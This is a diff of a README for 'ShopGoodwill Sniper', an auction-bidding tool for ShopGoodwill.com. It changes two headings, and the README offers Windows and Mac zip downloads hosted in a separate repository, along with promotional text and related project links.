@@ -1,6 +1,6 @@
 # ShopGoodwill Sniper
 ![ShopGoodwill Sniper](https://github.com/Auction-Sniper/ShopGoodwill/blob/main/images/shopgoodwillsniper2.png?raw=true)
-## Downloads
+## Download
 [![ShopGoodwill Sniper Windows](https://github.com/Auction-Sniper/ShopGoodwill/blob/main/images/auctionsniper-windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/shopgoodwill-sniper-windows.zip)  |  [![ShopGoodwill Sniper Mac](https://github.com/Auction-Sniper/ShopGoodwill/blob/main/images/auctionsniper-mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/shopgoodwill-sniper-mac.zip)
 :-------------------------:|:-------------------------:
 [Windows](https://github.com/appdownloads/software/raw/main/shopgoodwill-sniper-windows.zip)             |  [Mac](https://github.com/appdownloads/software/raw/main/shopgoodwill-sniper-mac.zip)
@@ -18,7 +18,7 @@
 The ShopGoodwill Sniper is a sniping tool for use with the ShopGoodwill.com website. Snipe all your auctions simultaneously at the last second on ShopGoodwill.com with this bidding software. Organize and schedule all your bids in one workplace like a real professional. Never reveal your password to us, this software runs on your own computer, unlike others this is not a service, this is an actual complete auction sniper software. Never miss another auction, Minimize to System Tray, for running in background.
 #### ShopGoodwill Auction Sniper
 [![ShopGoodwill Bid Sniper](https://img.youtube.com/vi/Bee4D1jd3E4/0.jpg)](https://www.youtube.com/watch?v=Bee4D1jd3E4)
-#### Snipers
+#### Auction Snipers
 [![Auction Sniper](https://github.com/Auction-Sniper/ShopGoodwill/blob/main/images/auctionsniper.png?raw=true)](https://github.com/Auction-Sniper/app)  |  [![eBay Sniper](https://github.com/Auction-Sniper/ShopGoodwill/blob/main/images/ebaysniper.png?raw=true)](https://github.com/Auction-Sniper/ebay)
 :-------------------------:|:-------------------------:
 [All-In-One Snipers](https://github.com/Auction-Sniper/app)             |  [eBay](https://github.com/Auction-Sniper/ebay)
